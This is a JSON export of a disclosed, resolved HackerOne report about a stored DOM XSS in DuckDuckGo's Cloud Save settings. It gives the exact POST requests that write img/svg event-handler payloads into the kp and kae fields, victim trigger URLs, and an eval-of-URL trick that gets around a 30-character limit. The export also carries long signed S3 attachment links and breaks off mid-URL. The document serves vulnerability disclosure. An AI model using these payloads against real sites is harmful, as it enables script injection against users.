{"id":921635,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjE2MzU=","url":"https://hackerone.com/reports/921635","title":"DOM XSS on duckduckgo.com search","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-07-12T18:07:27.265Z","submitted_at":"2020-07-12T18:07:27.265Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sijisu","url":"/sijisu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ifesz31kDzdrxysGYipHkzRB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":10995,"url":"https://hackerone.com/duckduckgo","handle":"duckduckgo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"DuckDuckGo","twitter_handle":"duckduckgo","website":"https://duckduckgo.com","about":"DuckDuckGo is the Internet privacy company for everyone who's had enough of hidden online tracking."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-20T15:49:37.725Z","bug_reporter_agreed_on_going_public_at":"2020-07-21T15:49:33.955Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey there,\n\nthere is a DOM XXS vulnerability on the https://duckduckgo.com/ search result page through the `kp` and `kae` parameters of the [Cloud Save](https://help.duckduckgo.com/duckduckgo-help-pages/settings/cloud-save/) feature.\n\nPOC URL: https://duckduckgo.com/?q=s\u0026key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070325\n\nVideo (Firefox 78.0.1): \n{F904609}\n\nVideo (Chromium 83.0.4103.116): \n{F904637}\n\n## How to reproduce?\n\nFirst, we need to create malicious \"Cloud Save\" setting with our XSS payloads, an attacker would do that on their computer, we can do that with the following request to duckduckgo.com:\n\n```\nPOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 248\n\n{\n\"command\":\"write\",\n\"objectKey\":\"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff\",\n\"obj\":{\n\"kp\":\"\\\"\u003e\u003cimg src=/ onerror=alert(1)\u003e\",\n\"kae\":\"\\\"\u003e\u003cimg src=/ onerror=alert(2)\u003e\"\n}\n}\n```\n\nNow we just need to visit duckduckgo.com with the key parameter set, an attacker would send this link to the victim, like this: https://duckduckgo.com/?q=a\u0026key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff. The Cloud Save key is now saved in the browser's Local Storage. Because the settings are downloaded from Cloud Save on every visit of the results page, our code will be executed every time as well. Try searching https://duckduckgo.com/?q=a, it even triggers on the settings page https://duckduckgo.com/settings and others.\n\n## What about longer payloads?\n\nYou cannot have Cloud Save settings property longer than 30 characters. However, there are many tricks on how to bypass this limitation. For example one of many great @terjanq 's payloads does the trick here. It evals the URL so you can make your payload long enough to execute malicious code.\n\nRequest to set up Cloud Save:\n\n```\nPOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 211\n\n{\n\"command\":\"write\",\n\"objectKey\":\"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324\",\n\"obj\":{\n\"kp\":\"\\\"\u003e\u003csvg/onload=eval(`'`+URL)\u003e\"\n}\n}\n```\n\nAnd URL that executes the code: https://duckduckgo.com/?q=s\u0026key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324#';alert(document.domain);\n\nVideo:\n{F904653}\n\n## Impact\n\nAttacker can execute JavaScript.","vulnerability_information_html":"\u003cp\u003eHey there,\u003c/p\u003e\n\n\u003cp\u003ethere is a DOM XXS vulnerability on the \u003ca title=\"https://duckduckgo.com/\" href=\"/redirect?url=https%3A%2F%2Fduckduckgo.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://duckduckgo.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e search result page through the \u003ccode\u003ekp\u003c/code\u003e and \u003ccode\u003ekae\u003c/code\u003e parameters of the \u003ca href=\"/redirect?url=https%3A%2F%2Fhelp.duckduckgo.com%2Fduckduckgo-help-pages%2Fsettings%2Fcloud-save%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCloud Save\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e feature.\u003c/p\u003e\n\n\u003cp\u003ePOC URL: \u003ca title=\"https://duckduckgo.com/?q=s\u0026amp;key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070325\" href=\"/redirect?url=https%3A%2F%2Fduckduckgo.com%2F%3Fq%3Ds%26key%3Dbb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070325\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://duckduckgo.com/?q=s\u0026amp;key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070325\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eVideo (Firefox 78.0.1): \u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"firefox2-2020-07-12_19.04.05.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sdWcfWmVDwrLLrwa4NRCf7nK?response-content-disposition=attachment%3B%20filename%3D%22firefox2-2020-07-12_19.04.05.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox2-2020-07-12_19.04.05.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071120Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=eb721d9c2b42b5d2e4105a8184aaf8fe355978f1fdd6a48d6077dd2c18189d97\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sdWcfWmVDwrLLrwa4NRCf7nK?response-content-disposition=attachment%3B%20filename%3D%22firefox2-2020-07-12_19.04.05.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox2-2020-07-12_19.04.05.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071120Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=eb721d9c2b42b5d2e4105a8184aaf8fe355978f1fdd6a48d6077dd2c18189d97\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eVideo (Chromium 83.0.4103.116): \u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"chromium2-2020-07-12_19.36.47.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ytuzBbf82jA7u61ALBTsiZW3?response-content-disposition=attachment%3B%20filename%3D%22chromium2-2020-07-12_19.36.47.mp4%22%3B%20filename%2A%3DUTF-8%27%27chromium2-2020-07-12_19.36.47.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071120Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=76937373335014f18333db44ad9074027ba8815f9c8b6969cf5c811afb098fef\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ytuzBbf82jA7u61ALBTsiZW3?response-content-disposition=attachment%3B%20filename%3D%22chromium2-2020-07-12_19.36.47.mp4%22%3B%20filename%2A%3DUTF-8%27%27chromium2-2020-07-12_19.36.47.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071120Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=76937373335014f18333db44ad9074027ba8815f9c8b6969cf5c811afb098fef\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"how-to-reproduce\"\u003eHow to reproduce?\u003c/h2\u003e\n\n\u003cp\u003eFirst, we need to create malicious \u0026quot;Cloud Save\u0026quot; setting with our XSS payloads, an attacker would do that on their computer, we can do that with the following request to duckduckgo.com:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 248\n\n{\n\u0026quot;command\u0026quot;:\u0026quot;write\u0026quot;,\n\u0026quot;objectKey\u0026quot;:\u0026quot;bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff\u0026quot;,\n\u0026quot;obj\u0026quot;:{\n\u0026quot;kp\u0026quot;:\u0026quot;\\\u0026quot;\u0026gt;\u0026lt;img src=/ onerror=alert(1)\u0026gt;\u0026quot;,\n\u0026quot;kae\u0026quot;:\u0026quot;\\\u0026quot;\u0026gt;\u0026lt;img src=/ onerror=alert(2)\u0026gt;\u0026quot;\n}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow we just need to visit duckduckgo.com with the key parameter set, an attacker would send this link to the victim, like this: \u003ca title=\"https://duckduckgo.com/?q=a\u0026amp;key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff\" href=\"/redirect?url=https%3A%2F%2Fduckduckgo.com%2F%3Fq%3Da%26key%3Dbb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://duckduckgo.com/?q=a\u0026amp;key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The Cloud Save key is now saved in the browser\u0026#39;s Local Storage. Because the settings are downloaded from Cloud Save on every visit of the results page, our code will be executed every time as well. Try searching \u003ca title=\"https://duckduckgo.com/?q=a\" href=\"/redirect?url=https%3A%2F%2Fduckduckgo.com%2F%3Fq%3Da\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://duckduckgo.com/?q=a\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, it even triggers on the settings page \u003ca title=\"https://duckduckgo.com/settings\" href=\"/redirect?url=https%3A%2F%2Fduckduckgo.com%2Fsettings\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://duckduckgo.com/settings\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and others.\u003c/p\u003e\n\n\u003ch2 id=\"what-about-longer-payloads\"\u003eWhat about longer payloads?\u003c/h2\u003e\n\n\u003cp\u003eYou cannot have Cloud Save settings property longer than 30 characters. However, there are many tricks on how to bypass this limitation. For example one of many great \u003ca href=\"/terjanq\"\u003e@terjanq\u003c/a\u003e \u0026#39;s payloads does the trick here. It evals the URL so you can make your payload long enough to execute malicious code.\u003c/p\u003e\n\n\u003cp\u003eRequest to set up Cloud Save:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 211\n\n{\n\u0026quot;command\u0026quot;:\u0026quot;write\u0026quot;,\n\u0026quot;objectKey\u0026quot;:\u0026quot;bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324\u0026quot;,\n\u0026quot;obj\u0026quot;:{\n\u0026quot;kp\u0026quot;:\u0026quot;\\\u0026quot;\u0026gt;\u0026lt;svg/onload=eval(`\u0026#39;`+URL)\u0026gt;\u0026quot;\n}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd URL that executes the code: \u003ca title=\"https://duckduckgo.com/?q=s\u0026amp;key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324#\u0026#39;;alert(document.domain)\" href=\"/redirect?url=https%3A%2F%2Fduckduckgo.com%2F%3Fq%3Ds%26key%3Dbb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324%23%27%3Balert%28document.domain%29\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://duckduckgo.com/?q=s\u0026amp;key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324#\u0026#39;;alert(document.domain)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e;\u003c/p\u003e\n\n\u003cp\u003eVideo:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"firefox3-2020-07-12_19.59.04.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wRgY6vRS32iwaTEVvrsPM8Ut?response-content-disposition=attachment%3B%20filename%3D%22firefox3-2020-07-12_19.59.04.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox3-2020-07-12_19.59.04.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071120Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=88c18bf871ca09322168621e22bd3113d730576f32657cda215f028bc5484c55\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wRgY6vRS32iwaTEVvrsPM8Ut?response-content-disposition=attachment%3B%20filename%3D%22firefox3-2020-07-12_19.59.04.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox3-2020-07-12_19.59.04.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071120Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XL